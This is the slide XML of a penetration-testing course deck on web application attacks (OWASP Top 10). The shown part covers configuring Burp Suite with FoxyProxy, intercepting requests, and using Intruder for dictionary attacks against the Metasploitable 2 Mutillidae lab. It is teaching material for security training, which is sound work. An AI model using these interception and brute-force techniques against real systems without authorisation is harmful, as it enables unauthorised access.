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sldIdLst>
    <p:sldId id="257" r:id="rId2"/>
    <p:sldId id="258" r:id="rId3"/>
    <p:sldId id="259" r:id="rId4"/>
    <p:sldId id="260" r:id="rId5"/>
    <p:sldId id="261" r:id="rId6"/>
    <p:sldId id="303" r:id="rId7"/>
    <p:sldId id="262" r:id="rId8"/>
    <p:sldId id="290" r:id="rId9"/>
    <p:sldId id="304" r:id="rId10"/>
    <p:sldId id="264" r:id="rId11"/>
    <p:sldId id="265" r:id="rId12"/>
    <p:sldId id="266" r:id="rId13"/>
    <p:sldId id="267" r:id="rId14"/>
    <p:sldId id="268" r:id="rId15"/>
    <p:sldId id="269" r:id="rId16"/>
    <p:sldId id="305" r:id="rId17"/>
    <p:sldId id="306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308" r:id="rId29"/>
    <p:sldId id="284" r:id="rId30"/>
    <p:sldId id="285" r:id="rId31"/>
    <p:sldId id="286" r:id="rId32"/>
    <p:sldId id="291" r:id="rId33"/>
    <p:sldId id="282" r:id="rId34"/>
    <p:sldId id="307" r:id="rId35"/>
    <p:sldId id="297" r:id="rId36"/>
    <p:sldId id="302" r:id="rId37"/>
    <p:sldId id="300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4176"/>
    <a:srgbClr val="9917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00" autoAdjust="0"/>
    <p:restoredTop sz="94660"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="100" d="100"/>
          <a:sy n="100" d="100"/>
        </p:scale>
        <p:origin x="72" y="-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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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038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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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665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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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680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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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345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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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836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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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69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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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902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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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657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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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502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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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903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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB7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9531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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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4740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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB7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277507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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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263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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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1175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B6DB-B9E2-4171-80EE-849FA75B16A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AFDC6-B40E-4C20-97F7-3078434EB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547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CB6DB-B9E2-4171-80EE-849FA75B16A8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8AAFDC6-B40E-4C20-97F7-3078434EB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72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9781" y="1398985"/>
            <a:ext cx="6858000" cy="1790700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="5250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Week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74056" y="3465910"/>
            <a:ext cx="6858000" cy="1241822"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Prepared by Umar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Niaz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Red Team Instructor at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Cyberster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11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" y="84140"/>
            <a:ext cx="8229600" cy="1325561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rgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Week 04: Web Application </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Penetration Testing </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(OWASP Top 10) </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B05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" y="1276350"/>
            <a:ext cx="8229600" cy="3144838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Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Objective: To identify and exploit the most common web-based </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>vulnerabilities using industry-standard tools and manual </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>techniques. </a:t>
            </a:r>
            <a:endParaRPr sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A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651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8073" y="142331"/>
            <a:ext cx="7772400" cy="1079501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rgbClr val="5147D1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Task 01: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Burp Suite Mastery </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(The Interceptor) </a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="7523C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4415" y="1355998"/>
            <a:ext cx="9850754" cy="5132704"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0" algn="l" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Description:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Focuses on traffic manipulation. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="l" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Technical Requirements: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>○ Configure </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Burp Suite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>with your browser </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>FoxyProxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>○ Practice </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Intercepting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> and modifying requests in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Proxy tab. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>○ Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Repeater</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> to replay requests and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Intruder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>simple </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>dictionary attacks.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="l" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Learning Goal:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Understand the "Request-Response“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="l" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> cycle and how to manipulate data. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/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2377882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47" y="101600"/>
            <a:ext cx="8715375" cy="675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Target </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean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Metasploitable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 2  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Mutillidae</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean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Part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1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Configure </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Burp Suite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> with your browser (using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>FoxyProxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>).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      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Step 1 — Start Burp Suite</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Open Burp Suite</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Select Temporary Project</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Click Next → Start Burp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Go to Proxy → Proxy Settings</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Confirm proxy listener is running on 127.0.0.1:8080</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Burp is now ready to intercept browser traffic</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="CC2E97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Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Step 2 — Install FoxyProxy Extension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CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Open Chrome or Firefox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CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Search for 'FoxyProxy Standard' in the extension store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CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Click 'Add to Browser'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CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>After installation, FoxyProxy icon appears in the browser </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>toolbar</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1800" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx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448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-1"/>
            <a:ext cx="10737669" cy="72760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Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Step 3 — Configure FoxyProxy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>FoxyProxy icon</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Options / Settings</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Add New Proxy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CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Configuration: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CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Proxy Type: HTTP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CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IP Address: 127.0.0.1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CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Port: 8080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CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Title: Burp </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Proxy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 smtClean="0"/>
              <a:t>Step </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>4 — Activate Burp </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" smtClean="0"/>
              <a:t>Proxy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>FoxyProxy icon again</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>profile: Burp Proxy (127.0.0.1:8080)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>All </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2E97"/>
                </a:solidFill>
              </a:rPr>
              <a:t>browser traffic will now pass through Burp Suite</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1800" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="941797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" y="0"/>
            <a:ext cx="5481856" cy="6727371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rgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Part 2  Intercept and Modify a Request</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B0F0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7523CF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Burp Suite → Proxy → Intercept</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Make sure </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Intercept is ON</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7523CF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7523CF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Open your browser and visit any website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7523CF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7523CF"/>
              </a:solidFill>
              <a:latin typeface="Arial Unicode MS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 err="1">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7523CF"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>mutillidae</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7523CF"/>
              </a:solidFill>
              <a:latin typeface="Arial Unicode MS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7523CF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The HTTP request will be captured in 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rgbClr val="7523CF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Burp Proxy → Intercept tab</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7523CF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7523CF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Example intercepted request:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7523CF"/>
              </a:solidFill>
              <a:latin typeface="Arial Unicode MS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chemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>GET / HTTP/1.1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>Host: example.com</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>User-Agent: Mozilla/5.0</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>Accept: text/html</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US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3858" y="0"/>
            <a:ext cx="4681047" cy="6858000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chemeClr val="accent5"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Modify the Request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7030A0"/>
                </a:solidFill>
